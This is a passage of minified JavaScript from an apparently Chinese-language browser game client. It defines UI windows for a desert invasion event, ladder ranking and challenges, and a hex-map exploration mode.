i=s.GlobalConfig.DesertInvasionNodeConfig[this._info.id];this._winDropShowArr.replaceAll(i.winDropShow),this._loseDropShowArr.replaceAll(i.loseDropShow);for(var n=0;n<this._memberArr.length;n++)this._memberArr[n].setHideInvide(!0);this._curPower=0,this.updateInfo()},e.prototype.updateInfo=function(){var t,e,i=s.GlobalConfig.DesertInvasionNodeConfig[this._info.id];if(this.mapname.text=null===i||void 0===i?void 0:i.fbname,this.bolMyTeam=!1,this._info.teamArr&&this._info.teamArr.length){this.playerGrp.visible=!0,this.monGrp.visible=!1,this._curPower=0;for(var n=[null,null,null],o=0,r=0,l=this._info.teamArr.length;l>r;r++)1==this._info.teamArr[r].isLeader?n[0]=this._info.teamArr[r]:(o++,n[o]=this._info.teamArr[r]),this._info.teamArr[r].id==a.ActorCC.actorID&&(this.bolMyTeam=!0),this._curPower+=this._info.teamArr[r].power;for(var r=0,l=this._memberArr.length;l>r;r++)this._memberArr[r].data=n[r]}else{this.playerGrp.visible=!1,this.monGrp.visible=!0,this._curPower=0;var u=s.GlobalConfig.MonstersConfig[i.bossId];this.monname.text=u.name,this.monpic.source="img"+(null===u||void 0===u?void 0:u.head)+"_png"||!1}var p=!this._curPower||h.InvadeCT.ins().getTeamPower()>=this._curPower;this.start.visible=p,this.eInfo.visible=!this.bolMyTeam&&!p,this.lastonerGrp.visible=!!this._info.lastLeaderName,this.lastoner.text="S."+(null===(t=this._info)||void 0===t?void 0:t.lastSerId)+"  "+(null===(e=this._info)||void 0===e?void 0:e.lastLeaderName),p&&(this.bolMyTeam?this.start.label=gettext("解散队伍"):this.start.label=gettext("参战"))},e.prototype.removeDisplay=function(){h.InvadeCT.ins().invadeTeamDatas.length&&h.InvadeCT.ins().sendTeamInfo(),this.skin&&this.removeObserve()},e}(n.BaseView);e.InvadeBossWin=u,window.InvadeBossWin=u,window.hhh=h,__reflect(u.prototype,"InvadeBossWin",[]),window.InvadeBossWin=u,window.hhh=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeSummaryWin=void 0;var n=i(1),o=i(0),s=i(4),a=i(88),r=i(71),l=i(7),h=i(82),u=i(431),p=i(432),d=function(t){function e(){var e=t.call(this)||this;return e._sn_="InvadesummarySkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.PerRanking.itemRenderer=p.InvadeRankItem,this.PerRanking.dataProvider=this.eArc=new eui.ArrayCollection,this.PerRanking0.itemRenderer=u.InvadeRankAwardItem,this.PerRanking0.dataProvider=null,this.addTouchEvent(this.closeBtn,this.onClick),this.addChangeEvent(this.ItemTab,this.onTab)},e.prototype.onClick=function(t){switch(t.target){case this.closeBtn:win.close(this)}},e.prototype.onTab=function(){this.updateView()},e.prototype.updateView=function(){0==this.ItemTab.selectedIndex?(this.summaryGrp.visible=!0,this.rankingGrp.visible=!1,this.awardGrp.visible=!1,this.updateSummaryGrp()):1==this.ItemTab.selectedIndex?(this.summaryGrp.visible=!1,this.rankingGrp.visible=!0,this.awardGrp.visible=!1,this.updateRankingGrp()):2==this.ItemTab.selectedIndex&&(this.summaryGrp.visible=!1,this.rankingGrp.visible=!1,this.awardGrp.visible=!0,this.updateAwardGrp())},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(h.InvadeCT.ins().postGetAllFightInfo,this.updateSummaryGrp),this.observe(a.Rank.ins().postRankingData,this.updataRankInfo),this.mapname.text=gettext("战绩总览"),this.ItemTab.selectedIndex=0,this.updateView(),h.InvadeCT.ins().sendGetAllFightInfo()},e.prototype.updateSummaryGrp=function(){this.severID.text=this.serverID0.text="S."+h.InvadeCT.ins().tarSerId,this.point0.text=h.InvadeCT.ins().myScore+"",this.point1.text=h.InvadeCT.ins().otherScore+"",this.swinaward.text=.01*o.GlobalConfig.DesertInvasionBaseConfig.winReward+"%";var t=h.InvadeCT.ins().myScoreDic,e=h.InvadeCT.ins().otherScoreDic;this.point11.text=(t[1]?t[1]:0)+"",this.point21.text=(t[2]?t[2]:0)+"",this.point31.text=(t[3]?t[3]:0)+"",this.point12.text=(e[1]?e[1]:0)+"",this.point22.text=(e[2]?e[2]:0)+"",this.point32.text=(e[3]?e[3]:0)+"",this.countL.visible=h.InvadeCT.ins().myWins>0,this.countR.visible=h.InvadeCT.ins().otherWins>0,this.countL.visible&&(this.wincountLGrp.visible=1!=h.InvadeCT.ins().myWins,this.wincountL.text=h.InvadeCT.ins().myWins+"",this.winL.visible=1==h.InvadeCT.ins().myWins),this.countR.visible&&(this.wincountRGrp.visible=1!=h.InvadeCT.ins().otherWins,this.wincountR.text=h.InvadeCT.ins().otherWins+"",this.winR.visible=1==h.InvadeCT.ins().otherWins)},e.prototype.updateRankingGrp=function(){this.leader0.data=null,this.member0.data=null,this.member1.data=null,this.selfrank0.text=gettext("未上榜"),this.selfpoint2.text="0",this.selfnameLabel1.text="S."+l.GameServerCC.serverID,this.selfnameLabel2.text=s.ActorCC.myName,a.Rank.ins().sendGetRankingData(r.RankDataType.TYPE_INVADE)},e.prototype.updataRankInfo=function(t){if(t.type==r.RankDataType.TYPE_INVADE){for(var e=t.getDataList(),i=[],n=0,o=0;o<e.length;o++){var a=e[o];1==a.pos?this.leader0.data=a:2==a.pos?this.member0.data=a:3==a.pos?this.member1.data=a:i.push(a),a.player==s.ActorCC.myName&&(n=a.score)}this.eArc.source=i,this.noPlayerTips.visible=!e.length,this.selfrank0.text=0<t.selfPos&&t.selfPos<=1e3?gettext("第{0}名",t.selfPos):gettext("未上榜"),this.selfpoint2.text=n.toString(),this.selfnameLabel1.text="S."+l.GameServerCC.serverID,this.selfnameLabel2.text=s.ActorCC.myName}},e.prototype.updateAwardGrp=function(){var t=[];for(var e in o.GlobalConfig.DesertInvasionPersonRankConfig){var i=o.GlobalConfig.DesertInvasionPersonRankConfig[e];t.push(i)}this.PerRanking0.dataProvider=new eui.ArrayCollection(t)},e.prototype.removeDisplay=function(){this.skin&&this.removeObserve()},e}(n.BaseView);e.InvadeSummaryWin=d,window.InvadeSummaryWin=d,__reflect(d.prototype,"InvadeSummaryWin",[]),window.InvadeSummaryWin=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LadderChallengeWin=void 0;var n=i(5),o=i(1),s=i(4),a=i(13),r=i(88),l=i(71),h=i(2),u=i(131),p=i(0),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ChallengeSkin",e.num=-1,e.sendCount=0,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updataHeadInfo,r.Rank.ins().postRankingData),u.Ladder.ins().sendGetSomeOne(),this.setMyHead(),this.startScrollHead(),this.ingImg.visible=!0,this.enterTime.visible=!1},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.ingImg.visible=!0,this.enterTime.visible=!1},e.prototype.setMyHead=function(){var t=a.SubRoles.ins().getSubRoleByIndex(0);this.myhead.source="yuanhead"+t.job+t.sex;var e=u.Ladder.ins().getLevelConfig();this.myname.text=s.ActorCC.myName,this.mylv.text=gettext("{0}{1}段",e.showLevel,e.showDan||"")},e.prototype.startScrollHead=function(){this.refushROllInfo(),Timer.start(500,3,this.changestr,this)},e.prototype.changestr=function(){this.num++;var t=[".","..","..."];this.ingImg.text=gettext("正在匹配中")+t[this.num%3],this.num>=2&&(this.showPointPlayerInfo(),this.rollOver())},e.prototype.updataHeadInfo=function(t){t.type==l.RankDataType.TYPE_POWER&&this.refushROllInfo()},e.prototype.rollOver=function(){this.ingImg.visible=!1,this.enterTime.visible=!0,this.rollTime=3,this.enterTime.text=gettext("即将进入战斗"),0==u.Ladder.ins().getActorInfo(1)&&0==u.Ladder.ins().getActorInfo(0)?(h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:未匹配到对手|")),win.close(this)):Timer.start(600,0,this.refushLabel,this)},e.prototype.refushLabel=function(){this.rollTime--,this.rollTime<1&&(this.sendStarPlay(),Timer.stop(this.refushLabel,this))},e.prototype.refushROllInfo=function(){this.otherlv.text=gettext("段位：？"),this.scrollHead.visible=!1;var t=this.getRankListOne()},e.prototype.showPointPlayerInfo=function(){var t=u.Ladder.ins().getActorInfo();0==t.length||0==t[1]&&0==t[0]||(this.otherHead.source="yuanhead"+(t[3]||1)+(t[4]||0),this.scrollHead.visible=!1,this.otherlv.text=gettext("{0}{1}段",p.GlobalConfig.TianTiDanConfig[t[5]][0].showLevel,t[6]),this.othername.textFlow=n.TextFlowMaker.generateTextFlow1(t[2]))},e.prototype.sendStarPlay=function(){u.Ladder.ins().sendStarPlay(u.Ladder.ins().getActorInfo(1),u.Ladder.ins().getActorInfo(0)),win.close(this)},e.prototype.getRankListOne=function(){var t=r.Rank.ins().getRankModel(l.RankDataType.TYPE_POWER);if(t&&t.getDataList().length<=0)return this.sendCount<2?(r.Rank.ins().sendGetRankingData(l.RankDataType.TYPE_POWER),this.sendCount++,null):null;this.sendCount=0;var e=t.getDataList(),i=e[Math.floor(Math.random()*e.length)];return i&&i.id==s.ActorCC.actorID?1==e.length?i:this.getRankListOne():i},e}(o.BaseView);e.LadderChallengeWin=d,window.LadderChallengeWin=d,__reflect(d.prototype,"LadderChallengeWin",[]),window.LadderChallengeWin=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LadderInfoPanel=void 0;var n=i(1),o=i(11),s=i(131),a=i(0),r=i(8),l=i(88),h=i(71),u=i(2),p=i(4),d=i(27),c=i(59),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ladderinfoskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.rewardList.itemRenderer=o.ItemBase,this.buyTime.textFlow=(new egret.HtmlTextParser).parser(gettext("<u>购买匹配次数</u>")),this.showNomber.textFlow=(new egret.HtmlTextParser).parser(gettext("<u>查看排名</u>")),this.showReward.textFlow=(new egret.HtmlTextParser).parser(gettext("<u>查看奖励</u>")),this.showNomber0.textFlow=(new egret.HtmlTextParser).parser(gettext("<u>上周排名</u>")),this.addTouchEvent(this.flowPlayer,this.onTap),this.addTouchEvent(this.buyTime,this.onTap),this.addTouchEvent(this.showNomber,this.onTap),this.addTouchEvent(this.showReward,this.onTap),this.addTouchEvent(this.showNomber0,this.onTap),this.addTouchEvent(this.closeBtn,this.onTap)},e.prototype.addDisplay=function(){observe(this,this.tadderInfoChange,s.Ladder.ins().postTadderChange),observe(this,this.tadderInfoChange,s.Ladder.ins().postRankInfoList),s.Ladder.ins().sendGetRankInfo(),this.tadderInfoChange()},e.prototype.updateTime=function(){var t=s.Ladder.ins().challgeNum,e=a.GlobalConfig.TianTiConstConfig.maxRestoreChallengesCount,i=t>0?"2ECA22":"f3311e",n=Math.round((s.Ladder.ins().challgeCd-egret.getTimer())/1e3);n=0>=n?0:n;var o=t>=e?gettext("(2小时恢复1次)"):gettext("(恢复倒计时：{0})",r.DateUtils.getFormatBySecond(n));this.lastNum.textFlow=tHtml(gettext("<font color=#{0}>剩余次数：{1}/{2} <font color={3}>{4}</font></font>",i.toString(),t,e,"#7E6437",o))},e.prototype.tadderInfoChange=function(){Timer.stop(this.updateTime,this),Timer.start(500,0,this.updateTime,this),this.updateTime();var t=l.Rank.ins().rankModel[h.RankDataType.TYPE_LADDER];t&&(this.winNum0.text=t.selfPos>0?""+t.selfPos:gettext("未上榜")),this.winNum.text=""+s.Ladder.ins().winNum,this.duanwei.text=s.Ladder.ins().getDuanWeiDesc();var e=s.Ladder.ins().getLevelConfig();e&&(this.rewardList.dataProvider=new eui.ArrayCollection(e.danAward)),this.winImg.visible=s.Ladder.ins().lianWin,this.starInfo.updataStarInfo(e),this.starInfo.setLvAndRank(e),this.noOpenDesc.visible=!s.Ladder.ins().isOpen,this.openInfo.visible=s.Ladder.ins().isOpen},e.prototype.onTap=function(t){switch(t.currentTarget){case this.flowPlayer:if(s.Ladder.ins().challgeNum<=0)return void u.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:挑战次数不足|"));if(win.get("LadderChallengeWin"))return;win.open("LadderChallengeWin");break;case this.buyTime:if(s.Ladder.ins().challgeNum>=a.GlobalConfig.TianTiConstConfig.maxRestoreChallengesCount)return void u.TipsCT.ins().showTips(gettext("挑战次数达到上限"));if(s.Ladder.ins().todayBuyTime==a.GlobalConfig.TianTiConstConfig.maxBuyChallengesCount)return void u.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:今日购买次数已达上限|"));if(p.ActorCC.yb<a.GlobalConfig.TianTiConstConfig.buyChallengesCountYuanBao)return void u.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|"));d.WarnWin.show(gettext("确定花费<font color='#FFB82A'>{0}元宝</font>购买1次王者争霸挑战次数吗？\n",a.GlobalConfig.TianTiConstConfig.buyChallengesCountYuanBao)+gettext("今日已购买：{0}/{1}",s.Ladder.ins().todayBuyTime,a.GlobalConfig.TianTiConstConfig.maxBuyChallengesCount),function(){s.Ladder.ins().sendBuyChallgeTime()},this);break;case this.showReward:win.open("LadderRewardTipWin");break;case this.showNomber:win.open("LadderLastRankWin",1);break;case this.showNomber0:s.Ladder.ins().upLevel>0?win.open("LadderLastRankWin",0):u.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:暂无上周排行数据|"));break;case this.closeBtn:win.close(this)}},e.openCheck=function(){var t=a.GlobalConfig.TianTiConstConfig.openLevel,e=p.ActorCC.level>=t;return e||(u.TipsCT.ins().showTips(gettext("{0}级开启",t)),c.GameFlashSaleCt.ins().reportLvNot()),e},Object.defineProperty(e.prototype,"winTitle",{get:function(){return"ladder_title2"},enumerable:!1,configurable:!0}),e}(n.BaseView);e.LadderInfoPanel=f,window.LadderInfoPanel=f,__reflect(f.prototype,"LadderInfoPanel",[]),window.LadderInfoPanel=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LadderLastRankWin=void 0;var n=i(1),o=i(1038),s=i(131),a=i(88),r=i(71),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ladderinforankingskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=o.LadderRankItemRenderer,this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0];this.setPanelInfo(i),this.titleDesc.source=1==i?"ladder_thisrank":"ladder_lastrank",this.rankDesc.text=1==i?gettext("我的战绩"):gettext("我的上周战绩")},e.prototype.setPanelInfo=function(t){var e;if(1==t){var i=a.Rank.ins().rankModel[r.RankDataType.TYPE_LADDER];this.list.dataProvider=new eui.ArrayCollection(i.getDataList()?i.getDataList():[]),this.myRank.text=i.selfPos>0?gettext("排名：{0}",i.selfPos):gettext("排名：未上榜"),this.WinNum.text=gettext("净胜场：{0}场",s.Ladder.ins().winNum),this.myDwIng.source="ladder_rank_"+s.Ladder.ins().level,e=s.Ladder.ins().getLevelConfig()}else this.list.dataProvider=new eui.ArrayCollection(s.Ladder.ins().getUpRankList()),this.myRank.text=s.Ladder.ins().upWeekRank>0?gettext("排名：{0}",s.Ladder.ins().upWeekRank):gettext("排名：未上榜"),this.WinNum.text=gettext("净胜场：{0}场",s.Ladder.ins().upWin),this.myDwIng.source="ladder_rank_"+s.Ladder.ins().upLevel,e=s.Ladder.ins().getLevelConfig(s.Ladder.ins().upLevel,s.Ladder.ins().upId);e.showDan>0?(this.levelBg.visible=!0,this.level.source="laddergradnum_"+e.showDan):(this.levelBg.visible=!1,this.level.source=null)},e.prototype.onClick=function(t){switch(t.target){case this.eClose:win.close("LadderLastRankWin")}},e}(n.BaseView);e.LadderLastRankWin=l,window.LadderLastRankWin=l,__reflect(l.prototype,"LadderLastRankWin",[]),window.LadderLastRankWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LadderRankItemRenderer=void 0;var n=i(3),o=i(131),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TiantiRankItem",e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;t.pos<=3?(this.rankImg.source="paihang"+t.pos,this.rank.text=""):(this.rank.text=t.pos+"",this.rankImg.source=""),this.nameLabel.text=t.player,this.winNum.text=gettext("{0}场",t.winNum),this.dwImg.source="ladder_rank_"+t.challgeLevel;var e=o.Ladder.ins().getLevelConfig(t.challgeLevel,t.challgeId);e&&e.showDan>0?(this.level.source="laddergradnum_"+e.showDan,this.levelBg.visible=!0):(this.level.source=null,this.levelBg.visible=!1)},e}(n.BaseItemRender);e.LadderRankItemRenderer=s,window.LadderRankItemRenderer=s,__reflect(s.prototype,"LadderRankItemRenderer",[]),window.LadderRankItemRenderer=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LadderResultWin=void 0;var n=i(1),o=i(20),s=i(32),a=i(131),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ladderresultwinskin",e.layoutNum=LayoutNum.top,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.isWin=t[0],this._flag=t[1],this.showLab.text=this.isWin?gettext("战斗胜利"):gettext("战斗失败"),win.close(this),this.sureBtn.name=gettext("退出"),this.s=5,this.updateCloseBtnLabel(),Timer.start(1e3,5,this.updateCloseBtnLabel,this),this.addTouchEvent(this.sureBtn,this.onTap)},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];a.Ladder.ins().exitResultWin(),Timer.stop(this.updateCloseBtnLabel,this),this.removeTouchEvent(this.sureBtn,this.onTap),o.GameMap.fubenID>0&&("isLadderResult"==this._flag?o.GameMap.fbType==s.FbCT.FB_PVP&&send(Ts.exitFB):send(Ts.exitFB))},e.prototype.onTap=function(t){switch(t.currentTarget){case this.sureBtn:win.close(this)}},e.prototype.updateCloseBtnLabel=function(){this.s--,this.s<=0&&win.close(this),this.sureBtn.label=this.sureBtn.name+"("+this.s+"s)"},e}(n.BaseView);e.LadderResultWin=r,window.LadderResultWin=r,__reflect(r.prototype,"LadderResultWin",[]),window.LadderResultWin=r},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LadderRewardTipWin=void 0;var n=i(1),o=i(0),s=i(433),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LadderRewardTipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstReward.itemRenderer=s.ItemLadderRewardTipRender,this.addChangeEvent(this.eTab,this.changeList)},e.prototype.updateView=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.eTab.selectedIndex=0;var i=o.GlobalConfig.TianTiDanConfig,n=o.GlobalConfig.TianTiRankAwardConfig;this.LevelDatas=[];for(var s in i){var a=i[s][0],l=new r;l.show=gettext("{0}段位",a.showLevel),l.rewards=a.danAward,this.LevelDatas.push(l)}this.RankDatas=[];for(var s in n){var a=n[s],l=new r,h=a.rank!=a.rank2?gettext("赛季第{0} - {1}名",a.rank,a.rank2):gettext("赛季第{0}名",a.rank);l.show=h,l.rewards=a.award,this.RankDatas.push(l)}this.changeList()},e.prototype.removeDisplay=function(){},e.prototype.changeList=function(){0==this.eTab.selectedIndex?this.lstReward.dataProvider=new eui.ArrayCollection(this.LevelDatas):this.lstReward.dataProvider=new eui.ArrayCollection(this.RankDatas)},e}(n.BaseView);e.LadderRewardTipWin=a,window.LadderRewardTipWin=a,__reflect(a.prototype,"LadderRewardTipWin",[]),window.LadderRewardTipWin=a;var r=function(){function t(){}return t}();window.LadderRewardTipData=r,__reflect(r.prototype,"LadderRewardTipData",[]),window.LadderRewardTipData=r},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingInfoPanel=void 0;var n=i(1),o=i(0),s=i(15),a=i(12),r=i(2),l=i(434),h=i(117),u=function(t){function e(){var e=t.call(this)||this;return e._sn_="LingJingInfoPanelSkin",e.monType=[1,2,3,4],e}return __extends(e,t),e.prototype.skinComplete=function(){this.buffList.itemRenderer=l.LingJingBuffItem,this.buffList.dataProvider=this.eArc=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];
this.addTouchEvent(this,this.onTap),this.observe(h.LingJingCT.ins().postLingJingBuff,this.updateBuff),this.updateView()},e.prototype.onTap=function(t){t.target},e.prototype.updateView=function(){for(var t=0,e=0,i=0,n=0;n<h.LingJingCT.ins().mapGridDic.length;n++)for(var s=h.LingJingCT.ins().mapGridDic[n],a=0;a<s.length;a++){var r=s[a];-1!=r.state&&(t++,1==r.state&&r.cfg&&(-1!=this.monType.indexOf(r.cfg.type)?e++:i++))}var l=o.GlobalConfig.LingJingBaseConfig.mapSize[0],u=o.GlobalConfig.LingJingBaseConfig.mapSize[1],p=(t/(l*u)*100).toFixed(2);this.MapSchedule.text=gettext("地图探索度：{0}%",p),this.MonkillSchedule.text=gettext("击杀怪物数量：{0}",e),this.WildSchedule.text=gettext("占领野外建筑数量：{0}",i),this.updateBuff()},e.prototype.updateBuff=function(){var t=h.LingJingCT.ins().buffIdList.concat();this.eArc.source=t},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=a.OpenSystem.ins().checkSysOpen(s.SystemType.LingJing);return i||r.TipsCT.ins().showTips(a.OpenSystem.ins().getNoOpenTips(s.SystemType.LingJing)),i},e.prototype.removeDisplay=function(){},e}(n.BaseView);e.LingJingInfoPanel=u,window.LingJingInfoPanel=u,__reflect(u.prototype,"LingJingInfoPanel",[]),window.LingJingInfoPanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingMainPanel=void 0;var n=i(16),o=i(1),s=i(0),a=i(15),r=i(4),l=i(20),h=i(12),u=i(7),p=i(2),d=i(435),c=i(117),f=i(1051),g=i(1052),m=i(1053),v=function(t){function e(){var e=t.call(this)||this;return e._sn_="LingJingMainSkin",e.regionList=[],e.scaleArr=[.4,.21,.8],e.scaleIdx=0,e.hexagonWidth=104,e.hexagonHeight=125,e.lastMoveTimes=0,e.bolInitPos=!1,e.WeatherInit=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){0==e.isFirstInit&&(c.LingJingCT.ins().sendLingJingMapInfo(),e.isFirstInit=!0),this.playerImg=new eui.Image,this.playerImg.source=c.LingJingJobImg[r.ActorCC.jobId],this.eG.addChild(this.playerImg),this.scaleIdx=0},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTap),this.observe(c.LingJingCT.ins().postLingJingWeather,this.onWeatherGet),this.observe(c.LingJingCT.ins().postLingJingEnergy,this.updateTopView),this.observe(c.LingJingCT.ins().postLingJingMaterial,this.updateTopView),this.observe(c.LingJingCT.ins().postLingJingMapInfo,this.updateMap),this.observe(c.LingJingCT.ins().postPlayerMapInfo,this.updatePlayerPos),this.observe(c.LingJingCT.ins().postLingJingGoGrid,this.updatePlayerPos),this.observe(c.LingJingCT.ins().postLingJingBuilding,this.updateMap),this.observe(c.LingJingCT.ins().postLingJingBuildLvUp,this.updateMap),this.observe(c.LingJingCT.ins().postLingJingFov,this.updateMap),this.observe(c.LingJingCT.ins().postLingJingNewPos,this.updatePlayerPos),this.observe(c.LingJingCT.ins().postLingJingEnd,this.onLingJingEnd),this.observe(c.LingJingCT.ins().postLingJingFbGet,this.onLingJingFbGet),this.initMap(),this.updatePlayerPos(),this.eSscrollVH(),this.Weather.visible=!1,this.WeatherInit=!1,c.LingJingCT.ins().sendLingJingWeather(),c.LingJingCT.ins().sendLingJingEnergy(),c.LingJingCT.ins().sendLingJingMaterial(),c.LingJingCT.ins().sendPlayerMapInfo(),c.LingJingCT.ins().sendLingJingBuilding(),this.updateTopView(),c.LingJingCT.ins().fbRewardObj&&(win.closeLast(),c.LingJingCT.ins().fbRewardObj=null)},e.prototype.eSscrollVH=function(){var t=this.scaleArr[this.scaleIdx];this.eG.scaleX=this.eG.scaleY=t,this.eSc.viewport.validateNow();var e=(this.eSc.viewport.contentWidth||this.eG.width)-this.eSc.width/this.eG.scaleX,i=this.playerImg.x-31-this.eSc.width/this.eG.scaleX/2,n=i>e?e:i;0>n&&(n=0),this.eSc.viewport.scrollH=n;var o=(this.eSc.viewport.contentHeight||this.eG.height)-this.eSc.height/this.eG.scaleY,s=this.playerImg.y-31-this.eSc.height/this.eG.scaleY/2,a=s>o?o:s;0>a&&(a=0),this.eSc.viewport.scrollV=a},e.prototype.createHexagon=function(t,e){var i=new d.LingJingItem;return i.x=t,i.y=e,i},e.prototype.initMap=function(){this.mapItemList=[];for(var t=s.GlobalConfig.LingJingBaseConfig.mapSize[0],e=s.GlobalConfig.LingJingBaseConfig.mapSize[1],i=e*this.hexagonHeight*.75,n=0;e>n;n++){this.mapItemList[n]=[];for(var o=0;t>o;o++){var a=o*this.hexagonWidth+n%2*(this.hexagonWidth/2),r=i-n*this.hexagonHeight*.75;this.mapItemList[n][o]=this.createHexagon(a,r),this.mapItemList[n][o].data={x:o,y:n},this.mapItemGrp.addChild(this.mapItemList[n][o])}}},e.prototype.updatePlayerPos=function(){var t=c.LingJingCT.ins().curPlayerPos;if(this.mapItemList[t.y]){var e=this.mapItemList[t.y][t.x];this.playerImg.x=e.x+this.hexagonWidth/2-31,this.playerImg.y=e.y+this.hexagonHeight/2-31,this.updateMap(),!t.x&&!t.y||this.bolInitPos||(this.bolInitPos=!0,this.eSscrollVH())}},e.prototype.updateMap=function(){console.log(":");for(var t=0;t<this.mapItemList.length;t++)for(var e=0;e<this.mapItemList[t].length;e++)this.mapItemList[t][e].updateView()},e.prototype.updateTopView=function(){this.ActionPoints.text=c.LingJingCT.ins().energy.toString(),this.Wood.text=c.LingJingCT.ins().getMaterialNum(11).toString(),this.Stone.text=c.LingJingCT.ins().getMaterialNum(12).toString(),this.Steel.text=c.LingJingCT.ins().getMaterialNum(13).toString(),this.Meat.text=c.LingJingCT.ins().getMaterialNum(14).toString(),this.Weather.source=this.getWeatherImgUrl(),this.updateSendTime()},e.prototype.onWeatherGet=function(){this.updateTopView(),this.playWeatherFlyIcon(),this.updateMap()},e.prototype.onLingJingEnd=function(){win.close(this)},e.prototype.onLingJingFbGet=function(){c.LingJingCT.ins().fbRewardObj&&(win.closeLast(),c.LingJingCT.ins().fbRewardObj=null)},e.prototype.onTap=function(t){var e;switch(t.target){case this.btnBuild:win.open(f.LingJingBuildWindow);break;case this.btnInfo:win.open(g.LingJingInfoWindow);break;case this.changeDif:this.scaleIdx++,this.scaleIdx=this.scaleIdx>this.scaleArr.length-1?0:this.scaleIdx,this.eSscrollVH();break;case this.btnHelp:win.open("CommonHelpWin",(null===(e=s.GlobalConfig.HelpInfoConfig[351])||void 0===e?void 0:e.text)||"")}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=h.OpenSystem.ins().checkSysOpen(a.SystemType.LingJing);return i||p.TipsCT.ins().showTips(h.OpenSystem.ins().getNoOpenTips(a.SystemType.LingJing)),c.LingJingCT.ins().checkInEndTime()?(p.TipsCT.ins().showTips(gettext("灵境探索活动处于结算时间")),!1):i},e.prototype.movePlayerToGrid=function(t,e){if(l.GameMap.checkIsInLingJing())return void p.TipsCT.ins().showTips(gettext("灵境副本中不能移动"));var i=this.mapItemList[e][t];if(i&&!(u.GameServerCC.serverTime-this.lastMoveTimes<1e3)){this.lastMoveTimes=u.GameServerCC.serverTime;var n=i.x+this.hexagonWidth/2-31,o=i.y+this.hexagonHeight/2-31;egret.Tween.get(this.playerImg).to({x:n,y:o},300).call(function(){c.LingJingCT.ins().sendLingJingGoGrid(t,e)})}},e.prototype.updateSendTime=function(){var t=u.GameServerCC.serverTime,e=1e3*s.GlobalConfig.LingJingBaseConfig.weatherRate,i=(Math.floor(t/e)+1)*e-t;Timer.has(this.sendWeatherTimeFun,this)||Timer.start(i,1,this.sendWeatherTimeFun,this);var n=s.GlobalConfig.LingJingBaseConfig.recover,o=n?1e3*n.time:0;o>6e4&&(o=6e4),o>0&&!Timer.has(this.sendEnergyTimeFun,this)&&Timer.start(o,-1,this.sendEnergyTimeFun,this)},e.prototype.sendWeatherTimeFun=function(){c.LingJingCT.ins().sendLingJingWeather()},e.prototype.sendEnergyTimeFun=function(){c.LingJingCT.ins().sendLingJingEnergy()},e.prototype.getWeatherImgUrl=function(){var t=c.LingJingCT.ins().weatherType,e="";switch(t){case c.LingJingWeather.SUNNY:e="lingjing_sunny";break;case c.LingJingWeather.RAINY:e="lingjing_rainy";break;case c.LingJingWeather.FOG:e="lingjing_fog";break;case c.LingJingWeather.WIND:e="lingjing_wind"+c.LingJingCT.ins().windDir}return e},e.prototype.playWeatherFlyIcon=function(){var t=this;if(this.WeatherInit)return void(this.Weather.visible=!0);this.WeatherInit=!0;var e=new 